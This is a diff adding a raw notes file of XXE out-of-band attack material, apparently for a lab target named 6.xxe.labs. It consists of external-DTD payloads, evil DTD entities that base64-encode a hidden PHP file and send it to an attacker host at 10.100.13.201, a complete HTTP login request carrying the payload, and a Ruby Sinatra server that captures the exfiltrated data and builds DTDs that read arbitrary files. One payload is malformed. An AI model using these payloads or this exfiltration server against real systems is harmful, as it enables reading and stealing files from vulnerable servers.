@@ -1,0 +1,121 @@
+TEST-FOR-XXE
+<!DOCTYPE XXE_OOB [
+<!ENTITY %S EvilDTD SYSTEM "http://10.100.13.200/evil.dtd" >
+
+%EvilDTD;
+%LoadOOBEnt;
+%OOB;
+
+]>
+
+------------------------------------
+
+<?xml version='1.0'?>
+<!DOCTYPE xxe [
+<!ENTITY % EvilDTD SYSTEM 'http://10.100.13.201/evil.dtd'>
+%EvilDTD;
+%LoadOOBEnt;
+%OOB;
+]>
+<login>
+<username>XXEME</username>
+<password>password</password>
+</login>"
+
+------------------------
+
+
+<!ENTITY % resource SYSTEM "php://filter/read=convert.base64-encode/resource=file:///var/www/xxe/6/.letmepass.php">
+<!ENTITY % LoadOOBEnt "<!ENTITY &#x25; OOB SYSTEM'http://10.100.13.200:443/?p=%resource;'>">
+
+
+
+-------------------------
+
+***raw xml for lab 6
+
+<?xml version='1.0'?>
+<!DOCTYPE xxe [
+<!ENTITY % EvilDTD SYSTEM 'http://10.100.13.201/evil.dtd'>
+%EvilDTD;
+%LoadOOBEnt;
+%OOB;
+]>
+<login>
+  <username>XXEME</username>
+  <password>password</password>
+</login>
+
+
+--------------------------
+=============================================================================
+=============================================================================
+=============================================================================
+
+
+
+=============================================================================
+=============================================================================
+=============================================================================
+=============================================================================
+
+
+POST /login.php HTTP/1.1
+Host: 6.xxe.labs
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0 Iceweasel/43.0.4
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: text/xml; charset=UTF-8
+AuthXXE: login
+X-Requested-With: XMLHttpRequest
+Referer: http://6.xxe.labs/
+Content-Length: 213
+Connection: close
+
+<?xml version='1.0'?>
+<!DOCTYPE xxe [
+<!ENTITY % EvilDTD SYSTEM 'http://10.100.13.201/evil.dtd'>
+%EvilDTD;
+%LoadOOBEnt;
+%OOB;
+]>
+<login>
+<username>XXEME</username>
+<password>password</password>
+</login>"
+
+-------------------------
+
+**** evil dtd located in /var/www/html
+
+<!ENTITY % resource SYSTEM "php://filter/read=convert.base64-encode/resource=file:///var/www/6/.letmepass.php">
+<!ENTITY % LoadOOBEnt "<!ENTITY &#x25; OOB SYSTEM 'http://10.100.13.201:443/?p=%resource;'>">
+
+--------------------------
+#!/usr/bin/env ruby
+
+require 'sinatra'
+
+set :port, ARGV[0] || 443  #set listening port here
+set :bind, '10.100.13.201' #so are aren't just listening locally
+set :public_folder, '/var/www/html'
+get "/" do
+  return "OHAI" if params[:p].nil?
+  f = File.open("./files/#{request.ip}#{Time.now.to_i}","w")
+  f.write(params[:p])
+  f.close
+  ""
+end
+
+get "/xml" do
+  return "" if params[:f].nil?
+
+<<END  
+<!ENTITY % payl SYSTEM "file://#{params[:f]}">
+<!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'http://#{request.host}:#{request.port}/?p=%payl;'>">
+END
+end
+
+
+
